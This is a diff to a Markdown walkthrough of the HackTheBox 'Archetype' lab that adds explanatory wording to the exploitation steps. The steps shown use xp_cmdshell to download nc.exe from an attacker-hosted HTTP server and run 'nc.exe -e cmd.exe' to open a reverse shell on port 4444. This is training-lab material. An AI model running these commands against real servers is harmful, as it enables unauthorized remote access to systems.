@@ -49,8 +49,8 @@
 * In a separate terminal in Kali navigate to the directory where the "nc.exe" is and run: `sudo python3 -m http.server 80`
 	* Go back to xp_cmdshell and download "nc.exe" from local machine to target `xp_cmdshell powershell -c cd c:\Users\sql_svc\Downloads\; wget http://10.10.16.233/nc.exe -outfile nc.exe`
 	* The Netcat was downloaded to the target successfully after receiving the "200" status response code.
-* Open another terminal in Kali and navigate to the directory above and and run `nc -lvnp 4444`
-	* Execute `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.16.233 4444`
+* Open another terminal in Kali and navigate to the directory above and and run `nc -lvnp 4444` to listen on port 4444.
+	* Execute `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.16.233 4444` to establish direct command line access.
 
 	![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/xp_cmdshell_netcat.png)
 
